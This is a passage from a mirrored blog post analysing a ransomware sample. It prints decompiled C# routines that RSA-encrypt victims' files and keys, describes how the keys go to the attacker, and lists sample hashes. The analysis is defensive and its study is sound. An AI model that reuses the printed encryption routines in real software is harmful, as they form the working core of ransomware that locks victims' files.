class="hljs-tag">&gt;</span></span>+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Modulus</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Exponent</span></span></span><span class="hljs-tag">&gt;</span></span>AQAB<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Exponent</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">RSAKeyValue</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><div class="spoiler">  <b class="spoiler_title">CryptKey () function</b> <div class="spoiler_text"><pre> <code class="css hljs"><span class="hljs-selector-tag"><span class="hljs-selector-tag">private</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">string</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">CryptKey</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">string</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">s</span></span>) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } <span class="hljs-selector-tag"><span class="hljs-selector-tag">array</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">Encoding</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.Default</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.GetBytes</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">s</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">Array</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.Reverse</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">array</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">try</span></span> { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } <span class="hljs-selector-tag"><span class="hljs-selector-tag">catch</span></span> { } <span class="hljs-selector-tag"><span class="hljs-selector-tag">return</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">str</span></span>; }</code> </pre></div></div><br>  The <b>SaveNotes ()</b> procedure saves the encrypted keys to the file <b>‚Äússda.far‚Äù</b> - this file must be sent to the attacker, he decrypts it with the help of the private key, which he has only.  Having a private key can easily decrypt files. <br>  Procedure <b>GetDrives ()</b> and <b>NetScan ()</b> - gets a list of directories. <br><br>  Procedure <b>SetDesktopWallpaper ()</b> - in theory should change the background image on the desktop, but does not work.  As a result of infection, the background image has not changed. <br><br>  If you look directly at the encryption procedure, you can see that not the entire file is encrypted, but only 3 iterations of 512 bytes are done.  If there is important information in the file, and the file is large, then perhaps there is a chance to recover part of the file.  Small files are not encrypted and the extension does not change. <br><br><div class="spoiler">  <b class="spoiler_title">File Encryption Procedure</b> <div class="spoiler_text"><pre> <code class="css hljs"><span class="hljs-selector-tag"><span class="hljs-selector-tag">private</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">void</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">CF</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">string</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">f1</span></span>) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } <span class="hljs-selector-tag"><span class="hljs-selector-tag">Array</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.Copy</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">sourceArray</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.repeatCount</span></span> * <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.blocksize</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">buffer4</span></span>, 0, <span class="hljs-selector-tag"><span class="hljs-selector-tag">buffer4</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.Length</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">Array</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.Copy</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">buffer4</span></span>, 0, <span class="hljs-selector-tag"><span class="hljs-selector-tag">buffer3</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.repeatCount</span></span> * (<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.blocksize</span></span> + 11), <span class="hljs-selector-tag"><span class="hljs-selector-tag">buffer4</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.Length</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">try</span></span> { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } <span class="hljs-selector-tag"><span class="hljs-selector-tag">catch</span></span> { } } } <span class="hljs-selector-tag"><span class="hljs-selector-tag">catch</span></span> { } }</code> </pre> <br></div></div><br>  Expansion of encrypted files is a random value, and it is probably necessary for the subsequent decryption according to the mask, and in order to distinguish the infected machines from one another. <br><br><h3>  findings </h3><br>  Unfortunately, without a private key, it is almost impossible to decrypt files.  Be sure to make copies of important information on external media, which must be disconnected from the computer. <br><br>  ZY  I apologize for a rather spontaneous analysis.  I decided to write this post, can someone come in handy.  I think the source code will help to see the whole work of the malicious program more clearly. <br><br>  ZY.ZYY: Added hashes: <br><br>  Archive: act of reconciliation ‚Ññ 317 formed 1 09112017.rar <br><br>  SHA-256: 1c3fc2fec4c383070c8c83d94173a1966aeeb140f3684188342e283b652e6197 <br>  MD5: 68904e1cc81e7f367a677c54fcea7422 <br>  SHA-1: 5d39c694e01a9bf3b10519ba81a8565a0ee40b7b <br><br>  Archived: act of reconciliation ‚Ññ317 formed 1 09112017.wsf <br><br>  SHA-256: 02f0b00bbd9a633a98315560490627a5f907266101a881fa076ec2480df53d91 <br>  MD5: b698f6cbf69a85c7185e1caf8356f275 <br>  SHA-1: dd8122e876bfe7e238642f43dfffd7a4c3e54af3 <br><br>  eselp3.ax <br><br>  SHA-256: b4f132e2625a788f2e8797495abe7e151a3242825752f62066c3ad2b4949b333 <br>  MD5: 980e8beac4c1538e68b2e80d5cd2bb23 <br>  SHA-1: 2f46d98b8c601104de4cc5afea146ef1682fc3a7 <br><br>  eselp4.ax <br><br>  SHA-256: b6e8d5bd9cae7bd2b3ea87fe3483050e3c644d795df77d7f45a1a435375e8f5c <br>  MD5: efea82173e5e09956ea5c7dbdb551297 <br>  SHA-1: 6ff4c69de879f3d40be9b5710e2a7245dba1352b </div><p>Source: <a href="https://habr.com/ru/post/342574/">https://habr.com/ru/post/342574/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../342562/index.html">Vim as an esoteric text editing language</a></li>
<li><a href="../342564/index.html">CubeDB: minimalistic storage of meters with multidimensional keys</a></li>
<li><a href="../342566/index.html">How to write your swagger and not regret it</a></li>
<li><a href="../342570/index.html">Rewrite the message database VKontakte from scratch and survive</a></li>
<li><a href="../342572/index.html">Classification of the humanities and techies by comments in VK</a></li>
<li><a href="../342576/index.html">User survey Habra</a></li>
<li><a href="../342578/index.html">Jest and Puppeteer: automation of testing web interfaces</a></li>
<li><a href="../342580/index.html">ShellCheck Static Analyzer and Script Improvement for Linux and Unix</a></li>
<li><a href="../342582/index.html">Top Ten Antivirus for Linux</a></li>
<li><a href="../342588/index.html">Microservices: deploy, coordination and data consistency</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>